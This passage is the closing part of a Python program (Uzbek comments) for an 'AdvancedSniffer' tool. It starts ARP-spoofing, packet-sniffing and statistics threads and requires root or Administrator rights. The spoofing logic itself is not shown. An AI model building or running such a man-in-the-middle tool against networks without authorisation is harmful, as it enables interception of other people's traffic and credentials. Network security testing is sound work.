        # ARP Spoofing thread
        self.spoof_thread = threading.Thread(
            target=self.spoof_process,
            daemon=True
        )
        
        # Sniffing thread
        self.sniff_thread = threading.Thread(
            target=self.sniff_process,
            daemon=True
        )
        
        # Stats thread
        self.stats_thread = threading.Thread(
            target=self.stats_display,
            daemon=True
        )
        
        self.spoof_thread.start()
        self.sniff_thread.start()
        self.stats_thread.start()
        
        # Main thread kutish
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.signal_handler(None, None)


def main():
    """Asosiy funksiya"""
    # Root/Administrator tekshirish
    if platform.system() != "Windows":
        if os.geteuid() != 0:
            print(f"{Fore.RED}❌ Administrator huquqida ishga tushiring!{Fore.RESET}")
            print(f"{Fore.YELLOW}💡 Buyruq: sudo python3 {sys.argv[0]}{Fore.RESET}")
            sys.exit(1)
    else:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(f"{Fore.RED}❌ Administrator sifatida ishga tushiring!{Fore.RESET}")
            sys.exit(1)
    
    # Colorama o'rnatilmaganligini tekshirish
    if not COLORS_AVAILABLE:
        print("⚠️  Colorama o'rnatilmagan. Rangli chiqish ishlamaydi.")
        print("💡 O'rnatish: pip install colorama")
        print()
    
    # Dasturni ishga tushirish
    sniffer = AdvancedSniffer()
    sniffer.run()


if __name__ == "__main__":
    main()
